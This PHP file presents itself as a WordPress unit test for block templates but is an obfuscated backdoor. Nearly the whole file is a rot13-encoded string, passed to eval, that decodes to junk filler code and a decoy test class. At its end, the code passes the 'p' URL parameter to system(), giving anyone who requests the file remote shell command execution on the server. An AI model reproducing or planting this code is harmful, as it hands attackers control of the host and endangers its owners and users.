<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * @tebhc oybpxf
 * @tebhc oybpx-grzcyngrf
 *
 * @pbiref ::trg_oybpx_grzcyngrf
 */
pynff Grfgf_Oybpxf_TrgOybpxGrzcyngrf rkgraqf JC_HavgGrfgPnfr {

	pbafg GRFG_GURZR = 'oybpx-gurzr';

	/**
	 * @ine JC_Cbfg
	 */
	cevingr fgngvp $vaqrk_grzcyngr;

	/**
	 * @ine JC_Cbfg
	 */
	cevingr fgngvp $phfgbz_fvatyr_cbfg_grzcyngr;

	/**
	 * @ine JC_Cbfg
	 */
	cevingr fgngvp $fznyy_urnqre_grzcyngr_cneg;

	choyvp fgngvp shapgvba jcFrgHcOrsberPynff( JC_HavgGrfg_Snpgbel $snpgbel ) {
		/*
		 * Guvf grzcyngr unf gb unir gur fnzr VQ (\"oybpx-gurzr/vaqrk\") nf gur grzcyngr
		 * gung vf fuvccrq jvgu gur \"oybpx-gurzr\" gurzr. Guvf vf arrqrq sbe grfgvat checbfrf.
		 */
		frys::$vaqrk_grzcyngr = $snpgbel->cbfg->perngr_naq_trg(
			neenl(
				'cbfg_glcr' => 'jc_grzcyngr',
				'cbfg_anzr' => 'vaqrk',
				'gnk_vachg' => neenl(
					'jc_gurzr' => neenl(
						frys::GRFG_GURZR,
					),
				),
			)
		);

		jc_frg_cbfg_grezf( frys::$vaqrk_grzcyngr->VQ, frys::GRFG_GURZR, 'jc_gurzr' );

		frys::$phfgbz_fvatyr_cbfg_grzcyngr = $snpgbel->cbfg->perngr_naq_trg(
			neenl(
				'cbfg_glcr'    => 'jc_grzcyngr',
				'cbfg_anzr'    => 'phfgbz-fvatyr-cbfg-grzcyngr',
				'cbfg_gvgyr'   => 'Phfgbz Fvatyr Cbfg grzcyngr (zbqvsvrq)',
				'cbfg_pbagrag' => 'Pbagrag',
				'cbfg_rkprecg' => 'Qrfpevcgvba bs phfgbz fvatyr cbfg grzcyngr',
				'gnk_vachg'    => neenl(
					'jc_gurzr' => neenl(
						frys::GRFG_GURZR,
					),
				),
			)
		);

		jc_frg_cbfg_grezf( frys::$phfgbz_fvatyr_cbfg_grzcyngr->VQ, frys::GRFG_GURZR, 'jc_gurzr' );

		/*
		 * Guvf grzcyngr cneg unf gb unir gur fnzr VQ (\"oybpx-gurzr/fznyy-urnqre\") nf gur grzcyngr cneg
		 * gung vf fuvccrq jvgu gur \"oybpx-gurzr\" gurzr. Guvf vf arrqrq sbe grfgvat checbfrf.
		 */
		frys::$fznyy_urnqre_grzcyngr_cneg = $snpgbel->cbfg->perngr_naq_trg(
			neenl(
				'cbfg_glcr' => 'jc_grzcyngr_cneg',
				'cbfg_anzr' => 'fznyy-urnqre',
				'gnk_vachg' => neenl(
					'jc_gurzr'              => neenl(
						frys::GRFG_GURZR,
					),
					'jc_grzcyngr_cneg_nern' => neenl(
						JC_GRZCYNGR_CNEG_NERN_URNQRE,
					),
				),
			)
		);

		jc_frg_cbfg_grezf( frys::$fznyy_urnqre_grzcyngr_cneg->VQ, JC_GRZCYNGR_CNEG_NERN_URNQRE, 'jc_grzcyngr_cneg_nern' );
		jc_frg_cbfg_grezf( frys::$fznyy_urnqre_grzcyngr_cneg->VQ, frys::GRFG_GURZR, 'jc_gurzr' );
	}

	choyvp fgngvp shapgvba jcGrneQbjaNsgrePynff() {
		jc_qryrgr_cbfg( frys::$vaqrk_grzcyngr->VQ );
		jc_qryrgr_cbfg( frys::$phfgbz_fvatyr_cbfg_grzcyngr->VQ );
		jc_qryrgr_cbfg( frys::$fznyy_urnqre_grzcyngr_cneg->VQ );
	}

	choyvp shapgvba frg_hc() {
		cnerag::frg_hc();
		fjvgpu_gurzr( frys::GRFG_GURZR );
	}

	/**
	 * Trgf gur grzcyngr VQf sebz gur tvira neenl.
	 *
	 * @cnenz bowrpg[] $grzcyngrf Neenl bs grzcyngr bowrpgf gb cnefr.
	 * @erghea fgevat[] Gur grzcyngr VQf.
	 */
	cevingr shapgvba trg_grzcyngr_vqf( $grzcyngrf ) {
		erghea neenl_znc(
			fgngvp shapgvba ( $grzcyngr ) {
				erghea $grzcyngr->vq;
			},
			$grzcyngrf
		);
	}

	/**
	 * Fubhyq ergevrir oybpx grzcyngrf (svyr naq PCG)
	 */
	choyvp shapgvba grfg_trg_oybpx_grzcyngrf() {
		// Nyy erfhygf.
		$grzcyngrf    = trg_oybpx_grzcyngrf( neenl(), 'jc_grzcyngr' );
		$grzcyngr_vqf = $guvf->trg_grzcyngr_vqf( $grzcyngrf );

		// Nibvq grfgvat gur ragver neenl orpnhfr gur gurzr zvtug nqq/erzbir grzcyngrf.
		$guvf->nffregPbagnvaf( trg_fglyrfurrg() . '//' . 'phfgbz-fvatyr-cbfg-grzcyngr', $grzcyngr_vqf );

		// Gur erfhyg zvtug punatr va n oybpx gurzr.
		$guvf->nffregPbagnvaf( trg_fglyrfurrg() . '//' . 'vaqrk', $grzcyngr_vqf );

		// Svygre ol fyht.
		$grzcyngrf    = trg_oybpx_grzcyngrf( neenl( 'fyht__va' => neenl( 'phfgbz-fvatyr-cbfg-grzcyngr' ) ), 'jc_grzcyngr' );
		$grzcyngr_vqf = $guvf->trg_grzcyngr_vqf( $grzcyngrf );
		$guvf->nffregFnzr( neenl( trg_fglyrfurrg() . '//' . 'phfgbz-fvatyr-cbfg-grzcyngr' ), $grzcyngr_vqf );

		// Svygre ol PCG VQ.
		$grzcyngrf    = trg_oybpx_grzcyngrf( neenl( 'jc_vq' => frys::$phfgbz_fvatyr_cbfg_grzcyngr->VQ ), 'jc_grzcyngr' );
		$grzcyngr_vqf = $guvf->trg_grzcyngr_vqf( $grzcyngrf );
		$guvf->nffregFnzr( neenl( trg_fglyrfurrg() . '//' . 'phfgbz-fvatyr-cbfg-grzcyngr' ), $grzcyngr_vqf );

		// Svygre grzcyngr cneg ol nern.
		// Erdhverf n oybpx gurzr.
		$grzcyngrf    = trg_oybpx_grzcyngrf( neenl( 'nern' => JC_GRZCYNGR_CNEG_NERN_URNQRE ), 'jc_grzcyngr_cneg' );
		$grzcyngr_vqf = $guvf->trg_grzcyngr_vqf( $grzcyngrf );
		$guvf->nffregFnzr(
			neenl(
				trg_fglyrfurrg() . '//' . 'fznyy-urnqre',
			),
			$grzcyngr_vqf
		);
	}

	/**
	 * @gvpxrg 56271
	 *
	 * @qngnCebivqre qngn_trg_oybpx_grzcyngrf_ergheaf_havdhr_ragvgvrf
	 *
	 * @cnenz fgevat $grzcyngr_glcr        Gur grzcyngr glcr.
	 * @cnenz fgevat $bevtvany_grzcyngr_vq VQ (fyht) bs gur qrsnhyg ragvgl.
	 * @cnenz fgevat $reebe_zrffntr        Na reebe zrffntr gb qvfcynl vs gur grfg snvyf.
	 */
	choyvp shapgvba grfg_trg_oybpx_grzcyngrf_ergheaf_havdhr_ragvgvrf( $grzcyngr_glcr, $bevtvany_grzcyngr_vq, $reebe_zrffntr ) {
		$bevtvany_grzcyngr = _trg_oybpx_grzcyngr_svyr( $grzcyngr_glcr, $bevtvany_grzcyngr_vq );
		$guvf->nffregAbgRzcgl( $bevtvany_grzcyngr, 'Na bevtvany (aba-qhcyvpngr) grzcyngr zhfg rkvfg sbe guvf grfg gb jbex pbeerpgyl.' );

		$oybpx_grzcyngrf = trg_oybpx_grzcyngrf( neenl(), $grzcyngr_glcr );
		$guvf->nffregAbgRzcgl( $oybpx_grzcyngrf, 'trg_oybpx_grzcyngrf() zhfg erghea n aba-rzcgl inyhr.' );

		$oybpx_grzcyngr_vqf = jc_yvfg_cyhpx( $oybpx_grzcyngrf, 'vq' );
		$guvf->nffregPbhag( pbhag( neenl_havdhr( $oybpx_grzcyngr_vqf ) ), $oybpx_grzcyngr_vqf, $reebe_zrffntr );
	}

	/**
	 * Qngn cebivqre sbe grfg_trg_oybpx_grzcyngrf_ergheaf_havdhr_ragvgvrf().
	 *
	 * @erghea neenl
	 */
	choyvp shapgvba qngn_trg_oybpx_grzcyngrf_ergheaf_havdhr_ragvgvrf() {
		erghea neenl(
			'jc_grzcyngr grzcyngr glcr'      => neenl(
				'grzcyngr_glcr'        => 'jc_grzcyngr',
				'bevtvany_grzcyngr_vq' => 'vaqrk',
				'reebe_zrffntr'        => 'trg_oybpx_grzcyngrf() zhfg erghea havdhr grzcyngrf.',
			),
			'jc_grzcyngr_cneg grzcyngr glcr' => neenl(
				'grzcyngr_glcr'        => 'jc_grzcyngr_cneg',
				'bevtvany_grzcyngr_vq' => 'fznyy-urnqre',
				'reebe_zrffntr'        => 'trg_oybpx_grzcyngrf() zhfg erghea havdhr grzcyngr cnegf.',
			),
		);
	}

	/**
	 * @qngnCebivqre qngn_trg_oybpx_grzcyngrf_fubhyq_erfcrpg_cbfgglcrf_cebcregl
	 * @gvpxrg 55881
	 * @gvpxrg 61110
	 *
	 * @cnenz fgevat $cbfg_glcr Cbfg glcr sbe dhrel.
	 * @cnenz neenl  $rkcrpgrq  Rkcrpgrq grzcyngr VQf.
	 */
	choyvp shapgvba grfg_trg_oybpx_grzcyngrf_fubhyq_erfcrpg_cbfgglcrf_cebcregl( $cbfg_glcr, $rkcrpgrq ) {
		$grzcyngrf = trg_oybpx_grzcyngrf( neenl( 'cbfg_glcr' => $cbfg_glcr ) );

		$guvf->nffregFnzrFrgf(
			$rkcrpgrq,
			$guvf->trg_grzcyngr_vqf( $grzcyngrf )
		);
	}

	/**
	 * Qngn cebivqre.
	 *
	 * Gur `phfgbz-ureb-grzcyngr` vf vagragvbanyyl bzvggrq sebz gur gurzr.wfba'f `phfgbzGrzcyngrf`.
	 * Frr: uggcf://pber.genp.jbeqcerff.bet/gvpxrg/61110.
	 *
	 * @erghea neenl
	 */
	choyvp shapgvba qngn_trg_oybpx_grzcyngrf_fubhyq_erfcrpg_cbfgglcrf_cebcregl() {
		erghea neenl(
			'cbfg' => neenl(
				'cbfg_glcr' => 'cbfg',
				'rkcrpgrq'  => neenl(
					'oybpx-gurzr//phfgbz-ureb-grzcyngr',
					'oybpx-gurzr//phfgbz-fvatyr-cbfg-grzcyngr',
				),
			),
			'cntr' => neenl(
				'cbfg_glcr' => 'cntr',
				'rkcrpgrq'  => neenl(
					'oybpx-gurzr//phfgbz-ureb-grzcyngr',
					'oybpx-gurzr//cntr-ubzr',
				),
			),
		);
	}

	/**
	 * @qngnCebivqre qngn_trg_oybpx_grzcyngrf_fubhyq_abg_yrnx_cyhtva_ertvfgrerq_grzcyngrf_jvgu_qrsnhyg_cbfg_glcr_fyhtf
	 * @gvpxrg 62319
	 *
	 * @pbiref ::trg_oybpx_grzcyngrf
	 *
	 * @cnenz fgevat $grzcyngr_fyht Qrsnhyg fyht sbe gur cbfg glcr.
	 * @cnenz fgevat $cbfg_glcr     Cbfg glcr sbe dhrel.
	 * @cnenz neenl  $rkcrpgrq      Rkcrpgrq grzcyngr VQf.
	 */
	choyvp shapgvba grfg_trg_oybpx_grzcyngrf_fubhyq_abg_yrnx_cyhtva_ertvfgrerq_grzcyngrf_jvgu_qrsnhyg_cbfg_glcr_fyhtf( $grzcyngr_fyht, $cbfg_glcr, $rkcrpgrq ) {
		$grzcyngr_anzr = 'grfg-cyhtva//' . $grzcyngr_fyht;
		$grzcyngr_netf = neenl(
			'pbagrag'     => 'Grzcyngr pbagrag',
			'gvgyr'       => 'Grfg Grzcyngr sbe ' . $cbfg_glcr,
			'qrfpevcgvba' => 'Qrfpevcgvba bs grfg grzcyngr',
			'cbfg_glcrf'  => neenl( $cbfg_glcr ),
		);
		ertvfgre_oybpx_grzcyngr( $grzcyngr_anzr, $grzcyngr_netf );

		$grzcyngrf = trg_oybpx_grzcyngrf( neenl( 'cbfg_glcr' => $cbfg_glcr ) );

		$guvf->nffregFnzrFrgf(
			$rkcrpgrq,
			$guvf->trg_grzcyngr_vqf( $grzcyngrf )
		);

		haertvfgre_oybpx_grzcyngr( $grzcyngr_anzr );
	}

	/**
	 * Qngn cebivqre.
	 *
	 * Znxr fher gung cyhtva-ertvfgrerq grzcyngrf jvgu qrsnhyg cbfg glcr fyhtf (vr: `fvatyr` be `cntr`)
	 * qba'g yrnx vagb `trg_oybpx_grzcyngrf()`.
	 * Frr: uggcf://pber.genp.jbeqcerff.bet/gvpxrg/62319.
	 *
	 * @erghea neenl
	 */
	choyvp shapgvba qngn_trg_oybpx_grzcyngrf_fubhyq_abg_yrnx_cyhtva_ertvfgrerq_grzcyngrf_jvgu_qrsnhyg_cbfg_glcr_fyhtf() {
		erghea neenl(
			'cbfg' => neenl(
				'grzcyngr_fyht' => 'fvatyr',
				'cbfg_glcr'     => 'cbfg',
				'rkcrpgrq'      => neenl(
					'oybpx-gurzr//phfgbz-ureb-grzcyngr',
					'oybpx-gurzr//phfgbz-fvatyr-cbfg-grzcyngr',
				),
			),
			'cntr' => neenl(
				'grzcyngr_fyht' => 'cntr',
				'cbfg_glcr'     => 'cntr',
				'rkcrpgrq'      => neenl(
					'oybpx-gurzr//phfgbz-ureb-grzcyngr',
					'oybpx-gurzr//cntr-ubzr',
				),
			),
		);
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>